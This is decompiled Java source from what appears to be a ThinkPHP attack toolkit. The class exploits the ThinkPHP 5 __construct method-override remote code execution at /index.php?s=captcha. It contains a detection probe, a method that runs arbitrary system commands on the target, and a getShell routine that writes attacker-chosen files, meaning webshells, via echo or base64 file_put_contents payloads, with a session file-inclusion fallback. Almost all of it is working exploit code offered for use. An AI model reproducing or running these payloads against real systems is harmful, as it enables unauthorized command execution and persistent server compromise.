/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import dylan.tools.Util;
/*    */ import java.io.UnsupportedEncodingException;
/*    */ import java.net.URLEncoder;
/*    */ import java.nio.charset.StandardCharsets;
/*    */ import java.util.ArrayList;
/*    */ import java.util.Base64;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_construct_code_exec_2
/*    */   implements BaseExp {
/* 16 */   private String results = null;
/* 17 */   private HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 21 */     url = url + "/index.php?s=captcha";
/* 22 */     String payload = "_method=__construct&method=GET&filter[]=var_dump&get[]=dylan";
/* 23 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 24 */     Response response = HttpTool.post(url, payload, this.property);
/* 25 */     if (response.getText().contains("string(5) \"dylan\"")) {
/* 26 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 27 */       return this.results;
/*    */     } 
/* 29 */     if (response.getError() != null) {
/* 30 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 31 */       return this.results;
/*    */     } 
/* 33 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 34 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 39 */     url = url + "/index.php?s=captcha";
/* 40 */     String payload = "_method=__construct&method=GET&filter[]=system&get[]=" + cmd;
/* 41 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 42 */     Response response = HttpTool.post(url, payload, this.property);
/* 43 */     if (response.getError() == null) {
/* 44 */       this.results = Util.regReplace(response.getText());
/*    */     } else {
/* 46 */       this.results = response.getError();
/*    */     } 
/* 48 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/*    */     try {
/* 54 */       String payload1 = "_method=__construct&method=GET&filter[]=system&get[]=echo '" + URLEncoder.encode(content.replace("'", "\""), "UTF-8") + "' >" + fileName;
/* 55 */       String payload2 = "_method=__construct&method=GET&filter[]=system&get[]=echo \"" + URLEncoder.encode(content.replace("\"", "'"), "UTF-8") + "\" >" + fileName;
/* 56 */       String base64Content = Base64.getEncoder().encodeToString(content.getBytes(StandardCharsets.UTF_8));
/* 57 */       content = URLEncoder.encode(base64Content, "UTF-8");
/* 58 */       String payload3 = "_method=__construct&method=GET&filter[]=system&get[]=file_put_contents('" + fileName + "','base64_decode('" + content + "'))";
/* 59 */       ArrayList<String> payloads = new ArrayList<>();
/* 60 */       payloads.add(payload1);
/* 61 */       payloads.add(payload2);
/* 62 */       payloads.add(payload3);
/* 63 */       for (String payload : payloads) {
/* 64 */         this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 65 */         Response response = HttpTool.post(url + "/index.php?s=captcha", payload, this.property);
/* 66 */         if (response.getError() == null) {
/* 67 */           this.property.clear();
/* 68 */           response = HttpTool.get(url + "/" + fileName, this.property);
/* 69 */           if (response.getCode() == 200) {
/* 70 */             this.results = "[+] 上传成功，请检查URL：" + url + "/" + fileName;
/* 71 */             return this.results;
/*    */           } 
/*    */         } 
/*    */       } 
/* 75 */       tp5_session_fi_getshell tp5sfg = new tp5_session_fi_getshell();
/* 76 */       this.results = tp5sfg.getshell(url, "/index.php?s=captcha", fileName, base64Content);
/* 77 */     } catch (UnsupportedEncodingException e) {
/* 78 */       this.results = "[-] 上传失败: " + e.getMessage();
/*    */     } 
/* 80 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_construct_code_exec_2.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */